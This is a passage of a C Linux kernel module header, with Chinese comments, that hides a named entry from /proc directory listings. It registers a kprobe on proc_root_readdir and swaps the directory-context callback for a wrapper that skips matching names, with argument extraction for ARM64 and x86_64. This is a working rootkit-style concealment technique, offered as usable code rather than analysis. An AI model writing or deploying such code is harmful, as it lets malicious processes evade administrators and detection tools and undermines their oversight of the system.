0;
    }
    return old_filldir(ctx, name, namelen, offset, ino, d_type);
}

/* kprobe 预处理：替换 ctx->actor 为我们的包装函数 */
static int handler_pre(struct kprobe *kp, struct pt_regs *regs)
{
#if defined(CONFIG_ARM64)
    struct dir_context *ctx = (struct dir_context *)regs->regs[1]; /* 第2个参数 */
#elif defined(CONFIG_X86_64)
    struct dir_context *ctx = (struct dir_context *)regs->si;      /* 第2个参数 */
#else
# error "Unsupported arch for kprobe argument extraction"
#endif
    if (!ctx || !ctx->actor)
        return 0;

    old_filldir = ctx->actor;
    ctx->actor  = my_filldir;
    return 0;
}

static struct kprobe kp_hide_procfs_dir = {
    .symbol_name = "proc_root_readdir",
    .pre_handler = handler_pre,
};

static bool start_hide_procfs_dir(const char* hide_dir_name)
{
    int ret;

    strlcpy(g_hide_dir_name, hide_dir_name ? hide_dir_name : "", sizeof(g_hide_dir_name));
    g_hide_dir_len = strlen(g_hide_dir_name);

    ret = register_kprobe(&kp_hide_procfs_dir);
    if (ret) {
        printk_debug("[hide_procfs_dir] register_kprobe failed: %d\n", ret);
        return false;
    }
    printk_debug("[hide_procfs_dir] kprobe installed, hiding \"%s\"\n", g_hide_dir_name);
    return true;
}

static void stop_hide_procfs_dir(void)
{
    unregister_kprobe(&kp_hide_procfs_dir);
    printk_debug("[hide_procfs_dir] kprobe removed\n");
}

#endif  /* _HIDE_PROCFS_DIR_H_ */